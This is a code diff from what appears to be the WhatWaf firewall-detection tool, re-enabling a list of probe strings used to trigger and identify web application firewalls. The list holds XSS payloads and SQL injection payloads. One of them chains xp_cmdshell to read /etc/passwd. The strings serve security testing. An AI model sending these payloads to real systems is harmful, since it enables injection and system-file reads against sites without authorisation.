@@ -68,19 +68,18 @@ DEFAULT_USER_AGENT = "whatwaf/{} (Language={}; Platform={})".format(
 # the WAF is, along with the information we will need
 # to identify what tampering method we should use
 WAF_REQUEST_DETECTION_PAYLOADS = (
-    ""
-    #"<frameset><frame src=\"javascript:alert('XSS');\"></frameset>",
-    #" AND 1=1 ORDERBY(1,2,3,4,5) --;",
-    #'><script>alert("testing");</script>',
-    #(
-    #    " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',"
-    #    "table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC "
-    #    "xp_cmdshell('cat ../../../etc/passwd')#"  # thank you sqlmap
-    #),
-    #'<img src="javascript:alert(\'XSS\');">',
-    #"'))) AND 1=1,SELECT * FROM information_schema.tables ((('",
-    #"' )) AND 1=1 (( ' -- rgzd",
-    #";SELECT * FROM information_schema.tables WHERE 2>1 AND 1=1 OR 2=2 -- qdEf '"
+    "<frameset><frame src=\"javascript:alert('XSS');\"></frameset>",
+    " AND 1=1 ORDERBY(1,2,3,4,5) --;",
+    '><script>alert("testing");</script>',
+    (
+        " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',"
+        "table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC "
+        "xp_cmdshell('cat ../../../etc/passwd')#"  # thank you sqlmap
+    ),
+    '<img src="javascript:alert(\'XSS\');">',
+    "'))) AND 1=1,SELECT * FROM information_schema.tables ((('",
+    "' )) AND 1=1 (( ' -- rgzd",
+    ";SELECT * FROM information_schema.tables WHERE 2>1 AND 1=1 OR 2=2 -- qdEf '"
 )
 
 # random home pages to try and get cookies
